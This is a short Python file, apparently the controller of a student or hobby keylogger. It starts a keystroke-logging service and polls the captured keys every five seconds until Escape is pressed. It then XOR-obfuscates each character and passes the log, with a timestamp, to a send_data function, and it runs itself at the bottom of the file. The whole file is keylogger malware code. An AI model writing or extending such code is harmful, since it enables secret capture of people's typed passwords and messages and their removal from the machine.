import datetime
import time
from KeyloggerService import service
from Encryption_file import encryptor
from FileWriter import file_writer
class KeyLoggerManager:
    def __init__(self):
        self.buffer = []
        self.to_encrypt = []


    def manager(self):

        service.start_logging()
        end = False
        while not end:
            self.buffer = service.get_logged_keys()
            if "<ESC>" in self.buffer:
                end = True
            time.sleep(5)
        timestamp = str(datetime.datetime.now())
        service.stop_logging()
        for char in self.buffer:
            self.to_encrypt.append(encryptor.ascii_xor(char))
        content = {timestamp: self.to_encrypt}
        file_writer.send_data(content,"yosi")

a= KeyLoggerManager()
a.manager()



